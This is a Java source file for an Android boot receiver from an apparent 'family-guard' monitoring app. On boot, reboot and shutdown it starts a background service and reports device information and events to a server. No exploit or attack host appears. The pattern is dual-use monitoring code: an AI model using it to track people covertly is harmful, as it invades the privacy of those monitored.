package com.inet.android.bs;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.preference.PreferenceManager;

import java.util.HashMap;
import java.util.Map;

import com.inet.android.certificate.R;
import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * BootBroadcastReceiver for start family-guard
 * 
 * @author johny homicide
 * 
 */
public class BootBroadcastReceiver extends BroadcastReceiver {

	Context mContext;
	private final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
	SharedPreferences sp;
	Resources path;

	@Override
	public void onReceive(Context context, Intent intent) {
		Logging.doLog("BootBroadCastReceiver", "onReceive", "onReceive");
		mContext = context;
		if (AppSettings.getState(0, context) == 0) {
			ServiceControl.startRequest4(context);
			return;
		}
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		path = mContext.getApplicationContext().getResources();
		String action = intent.getAction();
		if (action.equalsIgnoreCase(BOOT_ACTION)) {
			sendRequest(path.getString(R.string.boot));
			// send info request
			RequestList.sendInfoDeviceRequest(mContext);
			// for Service
			ServiceControl.runService(mContext);

		}
		if (action.equalsIgnoreCase(Intent.ACTION_REBOOT)) {
			sendRequest(path.getString(R.string.reboot));

		}
		if (action.equalsIgnoreCase(Intent.ACTION_SHUTDOWN)) {
			sendRequest(path.getString(R.string.shutdown));

		}
	}

	private void sendRequest(String str) {
		Map<String, Object> device = new HashMap<String, Object>();
		Map<String, String> info = new HashMap<String, String>();
		device.put("type", AppConstants.TYPE_SERVICE_REQUEST);
		device.put("time", ConvertDate.logTime());
		info.put("area", path.getString(R.string.device));
		info.put("event", str);
		device.put("info", info);

		RequestList.sendDataRequest(device, null, mContext);

	}
}
